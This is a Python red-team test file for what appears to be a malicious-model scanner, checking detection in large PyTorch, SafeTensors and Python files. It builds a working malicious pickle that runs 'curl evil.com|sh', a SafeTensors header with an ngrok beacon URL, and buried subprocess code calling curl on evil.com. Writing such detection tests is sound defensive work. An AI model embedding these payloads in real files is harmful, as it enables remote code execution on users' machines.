"""
Large-scale real-world testing.
Run: python3 tests/redteam/test_large_scale.py

Tests against multi-MB files and real HuggingFace downloads.
"""
import io
import json
import os
import struct
import sys
import tempfile
import time
import zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.analyzer.pickle_scanner import scan_pickle_bytes
from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
from scanner.analyzer.ast_visitor import analyze_python_source
from scanner.analyzer.taint_engine import analyze_taint
from scanner.analyzer.sandbox_executor import sandbox_execute

def test_large_pickle():
    """2.9MB PyTorch .pt with malicious data.pkl inside."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr("archive/data/0", b"\x00" * 1_000_000)
        zf.writestr("archive/data/1", b"\x00" * 1_000_000)
        pkl = b"\x80\x02\x8c\x02os\x8c\x06system\x93\x8c\x10curl evil.com|sh\x85R."
        zf.writestr("archive/data.pkl", pkl)
    data = buf.getvalue()
    findings = scan_pickle_bytes("model.pt", data)
    assert len(findings) > 0, "Should detect os.system in pickle"
    assert findings[0].rule_id == "HFS-050"
    print(f"  PASS: {len(data)/1024/1024:.1f}MB pickle — detected in {len(findings)} findings")

def test_large_safetensors():
    """1.9MB SafeTensors with C2 URL in metadata."""
    header = {"__metadata__": {"callback": "https://ngrok-free.app/beacon"}}
    offset = 0
    for i in range(60):
        header[f"layer.{i}.weight"] = {"dtype":"F32","shape":[768],"data_offsets":[offset,offset+3072]}
        offset += 3072
    hdr = json.dumps(header).encode()
    data = struct.pack("<Q", len(hdr)) + hdr + b"\x00" * max(offset, 2_000_000)
    findings = analyze_safetensors_file("m.safetensors", data)
    assert len(findings) > 0, "Should detect URL in metadata"
    print(f"  PASS: {len(data)/1024/1024:.1f}MB safetensors — {len(findings)} findings")

def test_hidden_in_large_code():
    """Attack buried in legitimate-looking code."""
    code = "import math\n" * 100  # 100 lines of legitimate imports
    code += "\n".join([f"def func_{i}(x): return x * {i}" for i in range(200)])
    code += "\n# Hidden attack\nimport subprocess\nsubprocess.run(['curl','evil.com'])\n"
    findings = analyze_python_source("big.py", code) + sandbox_execute("big.py", code)
    assert len(findings) > 0, "Should detect subprocess.run in large file"
    print(f"  PASS: {len(code)} chars ({code.count(chr(10))} lines) — {len(findings)} findings")

if __name__ == "__main__":
    print("Large-scale real-world tests:")
    test_large_pickle()
    test_large_safetensors()
    test_hidden_in_large_code()
    print("\n  ALL LARGE-SCALE TESTS PASSED")
